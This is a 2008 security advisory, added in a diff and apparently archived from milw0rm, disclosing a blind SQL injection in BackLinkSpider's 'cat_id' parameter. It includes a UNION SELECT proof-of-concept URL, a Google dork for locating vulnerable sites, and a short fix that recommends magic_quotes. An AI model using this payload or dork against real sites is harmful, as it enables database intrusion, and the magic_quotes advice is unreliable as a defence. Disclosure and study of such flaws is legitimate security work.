@@ -1,0 +1,88 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_95$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_95$2008] BackLinkSpider (cat_id) Blind Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : May, 5 th 2008
+Location       : Jakarta, Indonesia
+Web            : http://advisories.echo.or.id/adv/adv95-K-159-2008.txt
+Critical Lvl   : Medium
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : BackLinkSpider
+version       : unknown
+Vendor        : http://www.backlinkspider.com/
+Description   :
+
+BackLinkSpider is a free link exchange service designed to provide you with access to a growing number of link exchange partners in our link directory page
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "cat_id" parameter in backlinkspider's page is not properly verified before being used to sql query. 
+This can be exploited to execute sql query through the browser.
+Successful exploitation requires that "magic_quotes" is enabled.
+
+
+Poc/Exploit:
+
+~~~~~~~~~
+http://www.target.com/[backlinkspider_page_name].php?cat_id=[SQL]
+http://www.target.com/[backlinkspider_page_name].php?cat_id=-1%20union%20select%201,2,3,4,5,6,7,8,9,0,1,version(),3,4,5,6,7,8,9,0/*
+
+
+Dork:
+~~~~
+Google    : "Powered By BackLinkSpider" "inurl:backlinkspider.php"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 03 - 05 - 2008 bug found
+- 05 - 05 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+~ special for rgod - good bye mate, thanks for the great works.
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2008-05-05]
